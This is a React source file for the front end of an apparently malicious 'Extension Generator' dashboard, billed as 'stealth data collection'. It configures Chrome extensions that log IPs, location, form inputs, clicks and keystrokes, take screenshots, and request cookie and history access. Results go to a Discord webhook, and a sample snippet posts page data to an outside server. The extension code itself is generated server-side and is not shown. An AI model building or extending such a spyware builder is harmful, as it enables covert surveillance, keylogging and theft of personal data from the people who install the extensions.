import { useState } from "react";
import { Download, Puzzle, Code, Settings, Shield, Globe, Monitor, Camera, FileText, Zap, CheckCircle, Upload, Image as ImageIcon } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import Sidebar from "@/components/dashboard/sidebar";

interface ExtensionConfig {
  name: string;
  description: string;
  version: string;
  permissions: string[];
  features: string[];
  webhookUrl: string;
  customCode: string;
  profilePicture?: string;
  backgroundImage?: string;
}

const CY = {
  font: "Orbitron, sans-serif",
  mono: "JetBrains Mono, monospace",
  cyan: "#00f5ff",
  green: "#00ff9f",
  red: "#ff5050",
  yellow: "#ffc800",
  purple: "#a050ff",
  orange: "#ff6400",
};

function CyberLabel({ children }: any) {
  return (
    <span className="block mb-1.5 text-[9px] tracking-widest uppercase"
      style={{ color: "rgba(0,245,255,0.4)", fontFamily: CY.font, letterSpacing: "0.2em" }}>
      {children}
    </span>
  );
}

function CyberInput({ value, onChange, placeholder, type = "text", ...rest }: any) {
  return (
    <input type={type} value={value} onChange={onChange} placeholder={placeholder} {...rest}
      className="w-full px-3 py-2.5 text-xs outline-none transition-all"
      style={{ background: "rgba(0,245,255,0.04)", border: "1px solid rgba(0,245,255,0.2)", color: "#e0f8ff", fontFamily: CY.mono, fontSize: "12px" }}
      onFocus={e => { e.currentTarget.style.borderColor = "rgba(0,245,255,0.5)"; e.currentTarget.style.boxShadow = "0 0 12px rgba(0,245,255,0.08)"; }}
      onBlur={e => { e.currentTarget.style.borderColor = "rgba(0,245,255,0.2)"; e.currentTarget.style.boxShadow = "none"; }}
    />
  );
}

function CyberTextarea({ value, onChange, placeholder, rows = 4 }: any) {
  return (
    <textarea value={value} onChange={onChange} placeholder={placeholder} rows={rows}
      className="w-full px-3 py-2.5 text-xs outline-none transition-all resize-none"
      style={{ background: "rgba(0,245,255,0.04)", border: "1px solid rgba(0,245,255,0.2)", color: "#e0f8ff", fontFamily: CY.mono, fontSize: "12px" }}
      onFocus={e => { e.currentTarget.style.borderColor = "rgba(0,245,255,0.5)"; }}
      onBlur={e => { e.currentTarget.style.borderColor = "rgba(0,245,255,0.2)"; }}
    />
  );
}

function Panel({ title, icon: Icon, color = CY.cyan, children }: any) {
  return (
    <div style={{ background: "rgba(0,6,12,0.7)", border: `1px solid ${color}25` }}>
      <div className="px-5 py-4 border-b flex items-center gap-2"
        style={{ borderColor: `${color}18`, background: "rgba(0,8,20,0.6)" }}>
        <Icon className="w-4 h-4" style={{ color, filter: `drop-shadow(0 0 4px ${color})` }} />
        <span className="text-[11px] font-bold tracking-widest"
          style={{ fontFamily: CY.font, color, letterSpacing: "0.2em" }}>
          {title}
        </span>
      </div>
      <div className="p-5">{children}</div>
    </div>
  );
}

function CyberBtn({ children, onClick, disabled, variant = "primary", size = "md" }: any) {
  const v: Record<string, any> = {
    primary: { bg: "rgba(0,245,255,0.1)",  border: "rgba(0,245,255,0.4)",  color: "#00f5ff" },
    success: { bg: "rgba(0,255,159,0.08)", border: "rgba(0,255,159,0.4)",  color: "#00ff9f" },
    purple:  { bg: "rgba(160,80,255,0.1)", border: "rgba(160,80,255,0.4)", color: "#a050ff" },
    warning: { bg: "rgba(255,200,0,0.08)", border: "rgba(255,200,0,0.4)",  color: "#ffc800" },
  };
  const s = v[variant] || v.primary;
  const sz = size === "lg" ? "px-6 py-3 text-[11px]" : "px-4 py-2.5 text-[10px]";
  return (
    <button onClick={onClick} disabled={disabled}
      className={`flex items-center gap-2 ${sz} font-bold tracking-widest transition-all hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed`}
      style={{ background: s.bg, border: `1px solid ${s.border}`, color: s.color, fontFamily: CY.font, letterSpacing: "0.15em", cursor: disabled ? "not-allowed" : "pointer" }}>
      {children}
    </button>
  );
}

export default function ExtensionGenerator() {
  const [config, setConfig] = useState<ExtensionConfig>({
    name: "Custom IP Logger",
    description: "Track visitor information and activity",
    version: "1.0.0",
    permissions: ["activeTab", "storage", "tabs"],
    features: ["ip_tracking", "geolocation", "browser_info"],
    webhookUrl: "",
    customCode: "",
    profilePicture: undefined,
    backgroundImage: undefined,
  });
  const [isGenerating, setIsGenerating] = useState(false);
  const { toast } = useToast();

  const availablePermissions = [
    { id: "activeTab",    label: "Active Tab",    desc: "Access current tab information" },
    { id: "storage",      label: "Storage",       desc: "Store data locally" },
    { id: "tabs",         label: "All Tabs",      desc: "Access all open tabs" },
    { id: "cookies",      label: "Cookies",       desc: "Read and modify cookies" },
    { id: "history",      label: "History",       desc: "Access browsing history" },
    { id: "bookmarks",    label: "Bookmarks",     desc: "Access bookmarks" },
    { id: "webRequest",   label: "Web Requests",  desc: "Monitor network requests" },
    { id: "geolocation",  label: "Geolocation",   desc: "Access location data" },
    { id: "notifications",label: "Notifications", desc: "Show desktop notifications" },
  ];

  const availableFeatures = [
    { id: "ip_tracking",   label: "IP Tracking",        desc: "Log IP addresses",           icon: Globe,    color: CY.cyan },
    { id: "geolocation",   label: "Geolocation",        desc: "Get location data",          icon: Monitor,  color: CY.cyan },
    { id: "browser_info",  label: "Browser Info",       desc: "Collect browser details",    icon: Settings, color: CY.purple },
    { id: "screenshot",    label: "Screenshots",        desc: "Capture page screenshots",   icon: Camera,   color: CY.yellow },
    { id: "form_data",     label: "Form Data",          desc: "Track form inputs",          icon: FileText, color: CY.green },
    { id: "click_tracking",label: "Click Tracking",     desc: "Monitor user clicks",        icon: Zap,      color: CY.orange },
    { id: "keylogger",     label: "Keystroke Logging",  desc: "Log keyboard activity",      icon: Shield,   color: CY.red },
  ];

  const togglePermission = (perm: string) => {
    setConfig(prev => ({
      ...prev,
      permissions: prev.permissions.includes(perm)
        ? prev.permissions.filter(p => p !== perm)
        : [...prev.permissions, perm],
    }));
  };

  const toggleFeature = (feat: string) => {
    setConfig(prev => ({
      ...prev,
      features: prev.features.includes(feat)
        ? prev.features.filter(f => f !== feat)
        : [...prev.features, feat],
    }));
  };

  const generateExtension = async () => {
    if (!config.name.trim()) {
      toast({ title: "NAME REQUIRED", description: "Enter an extension name", variant: "destructive" });
      return;
    }
    if (config.webhookUrl.trim() && !config.webhookUrl.startsWith("https://discord.com/api/webhooks/") && !config.webhookUrl.startsWith("https://discordapp.com/api/webhooks/")) {
      toast({ title: "INVALID WEBHOOK URL", description: "Use a valid Discord webhook URL or leave empty", variant: "destructive" });
      return;
    }
    setIsGenerating(true);
    try {
      const token = localStorage.getItem("token");
      if (!token) throw new Error("No authentication token found");
      const response = await fetch("/api/generate-extension", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
        body: JSON.stringify(config),
      });
      if (!response.ok) {
        const err = await response.json().catch(() => ({ error: "Failed to generate extension" }));
        throw new Error(err.error || "Failed to generate extension");
      }
      const contentType = response.headers.get("content-type");
      if (!contentType?.includes("application/zip")) throw new Error("Server returned invalid file format");
      const blob = await response.blob();
      if (blob.size === 0) throw new Error("Generated extension file is empty");
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `${config.name.replace(/\s+/g, "_").toLowerCase()}_extension.zip`;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
      toast({ title: "EXTENSION GENERATED", description: "Download started successfully" });
    } catch (error) {
      toast({ title: "GENERATION FAILED", description: error instanceof Error ? error.message : "Unknown error", variant: "destructive" });
    } finally {
      setIsGenerating(false);
    }
  };

  const handleImageFile = (key: "profilePicture" | "backgroundImage") => (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => setConfig(prev => ({ ...prev, [key]: ev.target?.result as string }));
    reader.readAsDataURL(file);
  };

  return (
    <div className="flex h-screen overflow-hidden relative" style={{ background: "#000508" }}>
      {/* Scan lines */}
      <div className="fixed inset-0 pointer-events-none z-0 opacity-[0.015]"
        style={{ backgroundImage: "repeating-linear-gradient(0deg,#00f5ff 0px,#00f5ff 1px,transparent 1px,transparent 4px)" }} />
      <div className="fixed top-0 right-0 w-96 h-96 pointer-events-none z-0 opacity-10"
        style={{ background: "radial-gradient(circle at top right, rgba(160,80,255,0.3), transparent 70%)" }} />

      <Sidebar />

      <main className="flex-1 overflow-auto relative z-10 pb-16 md:pb-0" style={{ minWidth: 0 }}>
        {/* Header */}
        <header className="sticky top-0 z-20 px-4 md:px-6 py-4 border-b"
          style={{ background: "rgba(0,4,12,0.97)", borderColor: "rgba(160,80,255,0.2)", backdropFilter: "blur(20px)" }}>
          <div className="absolute top-0 left-0 right-0 h-px"
            style={{ background: "linear-gradient(90deg, transparent, rgba(160,80,255,0.6) 30%, rgba(0,245,255,0.6) 70%, transparent)" }} />
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <Puzzle className="w-4 h-4" style={{ color: CY.purple, filter: "drop-shadow(0 0 6px rgba(160,80,255,0.8))" }} />
              <div>
                <h1 className="text-base md:text-lg font-black tracking-widest"
                  style={{ fontFamily: CY.font, color: CY.purple, textShadow: "0 0 15px rgba(160,80,255,0.5)", letterSpacing: "0.2em" }}>
                  EXTENSION GENERATOR
                </h1>
                <p className="text-[10px] tracking-widest" style={{ color: "rgba(0,245,255,0.4)", fontFamily: CY.mono }}>
                  // CHROME EXTENSION BUILDER — STEALTH DATA COLLECTION
                </p>
              </div>
            </div>
            <div className="flex items-center gap-1.5 px-2.5 py-1.5"
              style={{ background: "rgba(160,80,255,0.08)", border: "1px solid rgba(160,80,255,0.3)" }}>
              <Puzzle className="w-3 h-3" style={{ color: CY.purple }} />
              <span className="text-[9px] font-bold tracking-widest" style={{ color: CY.purple, fontFamily: CY.font, letterSpacing: "0.15em" }}>
                MV3 READY
              </span>
            </div>
          </div>
        </header>

        <div className="p-4 md:p-6 space-y-4 max-w-4xl">
          {/* Basic Config */}
          <Panel title="BASIC CONFIGURATION" icon={Settings} color={CY.cyan}>
            <div className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <CyberLabel>EXTENSION NAME</CyberLabel>
                  <CyberInput value={config.name} onChange={(e: any) => setConfig(p => ({ ...p, name: e.target.value }))} placeholder="Custom IP Logger" />
                </div>
                <div>
                  <CyberLabel>VERSION</CyberLabel>
                  <CyberInput value={config.version} onChange={(e: any) => setConfig(p => ({ ...p, version: e.target.value }))} placeholder="1.0.0" />
                </div>
              </div>
              <div>
                <CyberLabel>DESCRIPTION</CyberLabel>
                <CyberTextarea value={config.description} onChange={(e: any) => setConfig(p => ({ ...p, description: e.target.value }))} placeholder="Describe what your extension does..." rows={3} />
              </div>
              <div>
                <CyberLabel>DISCORD WEBHOOK URL (OPTIONAL)</CyberLabel>
                <CyberInput value={config.webhookUrl} onChange={(e: any) => setConfig(p => ({ ...p, webhookUrl: e.target.value }))}
                  placeholder="https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
                  data-testid="input-webhook" />
                <p className="text-[10px] mt-1" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.mono }}>
                  // Leave empty to only log to EX LOGS — no Discord notifications
                </p>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {[
                  { label: "PROFILE PICTURE (OPTIONAL)", key: "profilePicture" as const, color: CY.cyan, hint: "Extension icon/profile image" },
                  { label: "BACKGROUND IMAGE (OPTIONAL)", key: "backgroundImage" as const, color: CY.purple, hint: "Extension popup background" },
                ].map(({ label, key, color, hint }) => (
                  <div key={key}>
                    <CyberLabel>{label}</CyberLabel>
                    <label className="flex items-center gap-2 px-3 py-2.5 cursor-pointer transition-all hover:scale-[1.01]"
                      style={{ background: `${color}06`, border: `1px solid ${color}20` }}>
                      <ImageIcon className="w-3.5 h-3.5 flex-shrink-0" style={{ color }} />
                      <span className="text-[10px] flex-1" style={{ color: `${color}80`, fontFamily: CY.mono }}>
                        {config[key] ? "IMAGE LOADED" : "CLICK TO UPLOAD"}
                      </span>
                      {config[key] && <CheckCircle className="w-3.5 h-3.5 flex-shrink-0" style={{ color: CY.green }} />}
                      <input type="file" accept="image/*" className="hidden" onChange={handleImageFile(key)} />
                    </label>
                    <p className="text-[9px] mt-1" style={{ color: "rgba(0,245,255,0.25)", fontFamily: CY.mono }}>{hint}</p>
                  </div>
                ))}
              </div>
            </div>
          </Panel>

          {/* Permissions */}
          <Panel title="PERMISSIONS" icon={Shield} color={CY.green}>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
              {availablePermissions.map(p => {
                const isActive = config.permissions.includes(p.id);
                return (
                  <button key={p.id} onClick={() => togglePermission(p.id)}
                    className="p-3 text-left transition-all duration-150"
                    style={{
                      background: isActive ? "rgba(0,255,159,0.1)" : "rgba(0,245,255,0.03)",
                      border: `1px solid ${isActive ? "rgba(0,255,159,0.4)" : "rgba(0,245,255,0.1)"}`,
                      cursor: "pointer",
                    }}>
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-[10px] font-bold tracking-widest"
                        style={{ color: isActive ? CY.green : "rgba(200,240,255,0.6)", fontFamily: CY.font, letterSpacing: "0.1em" }}>
                        {p.label.toUpperCase()}
                      </span>
                      {isActive && <CheckCircle className="w-3 h-3 flex-shrink-0" style={{ color: CY.green }} />}
                    </div>
                    <p className="text-[9px]" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.mono }}>{p.desc}</p>
                  </button>
                );
              })}
            </div>
          </Panel>

          {/* Features */}
          <Panel title="DATA COLLECTION FEATURES" icon={Code} color={CY.purple}>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
              {availableFeatures.map(f => {
                const isActive = config.features.includes(f.id);
                const Icon = f.icon;
                return (
                  <button key={f.id} onClick={() => toggleFeature(f.id)}
                    className="p-3 text-left transition-all duration-150"
                    style={{
                      background: isActive ? `${f.color}10` : "rgba(0,245,255,0.03)",
                      border: `1px solid ${isActive ? `${f.color}40` : "rgba(0,245,255,0.1)"}`,
                      cursor: "pointer",
                    }}>
                    <div className="flex items-center justify-between mb-1">
                      <div className="flex items-center gap-2">
                        <Icon className="w-3.5 h-3.5 flex-shrink-0" style={{ color: isActive ? f.color : "rgba(0,245,255,0.3)" }} />
                        <span className="text-[10px] font-bold tracking-widest"
                          style={{ color: isActive ? f.color : "rgba(200,240,255,0.6)", fontFamily: CY.font, letterSpacing: "0.1em" }}>
                          {f.label.toUpperCase()}
                        </span>
                      </div>
                      {isActive && <CheckCircle className="w-3 h-3 flex-shrink-0" style={{ color: f.color }} />}
                    </div>
                    <p className="text-[9px]" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.mono }}>{f.desc}</p>
                  </button>
                );
              })}
            </div>
          </Panel>

          {/* Custom Code */}
          <Panel title="CUSTOM JAVASCRIPT CODE" icon={Code} color={CY.yellow}>
            <div>
              <CyberTextarea
                value={config.customCode}
                onChange={(e: any) => setConfig(p => ({ ...p, customCode: e.target.value }))}
                placeholder={`// Add custom JavaScript to execute in your extension
console.log('Extension loaded!');

// Example: Send custom data
function sendCustomData() {
  const data = {
    url: window.location.href,
    timestamp: Date.now()
  };
  fetch('https://your-server.com/api/track', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
}`}
                rows={12}
              />
              <p className="text-[10px] mt-2" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.mono }}>
                // Custom code runs in extension context — optional
              </p>
            </div>
          </Panel>

          {/* Generate */}
          <Panel title="GENERATE EXTENSION" icon={Download} color={CY.green}>
            <div className="space-y-4">
              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                <div>
                  <div className="text-sm font-bold mb-1" style={{ color: "rgba(200,240,255,0.9)", fontFamily: "Rajdhani, sans-serif" }}>
                    READY TO PACKAGE
                  </div>
                  <div className="text-[10px]" style={{ color: "rgba(0,245,255,0.35)", fontFamily: CY.mono }}>
                    {config.features.length} feature{config.features.length !== 1 ? "s" : ""} · {config.permissions.length} permission{config.permissions.length !== 1 ? "s" : ""} selected
                  </div>
                </div>
                <CyberBtn onClick={generateExtension} disabled={isGenerating || !config.name.trim()} variant="success" size="lg">
                  {isGenerating ? (
                    <>
                      <div className="w-3 h-3 border animate-spin" style={{ borderColor: "rgba(0,255,159,0.2)", borderTopColor: CY.green }} />
                      GENERATING...
                    </>
                  ) : (
                    <>
                      <Download className="w-3.5 h-3.5" />
                      GENERATE EXTENSION
                    </>
                  )}
                </CyberBtn>
              </div>

              {/* Install instructions */}
              <div className="p-4 space-y-2" style={{ background: "rgba(0,245,255,0.04)", border: "1px solid rgba(0,245,255,0.15)" }}>
                <div className="flex items-center gap-2 mb-2">
                  <Puzzle className="w-3 h-3" style={{ color: CY.cyan }} />
                  <span className="text-[10px] font-bold tracking-widest" style={{ color: CY.cyan, fontFamily: CY.font, letterSpacing: "0.15em" }}>
                    INSTALLATION INSTRUCTIONS
                  </span>
                </div>
                {[
                  "Extract the downloaded ZIP file",
                  "Open Chrome → chrome://extensions/",
                  "Enable Developer Mode (toggle top-right)",
                  "Click \"Load unpacked\" → select extracted folder",
                  "Extension is now active and collecting data",
                ].map((step, i) => (
                  <div key={i} className="flex items-start gap-2">
                    <span className="text-[9px] font-black w-4 flex-shrink-0 mt-0.5" style={{ color: CY.cyan, fontFamily: CY.font }}>{i + 1}</span>
                    <span className="text-[10px]" style={{ color: "rgba(200,240,255,0.6)", fontFamily: "Rajdhani, sans-serif" }}>{step}</span>
                  </div>
                ))}
              </div>
            </div>
          </Panel>
        </div>
      </main>
    </div>
  );
}
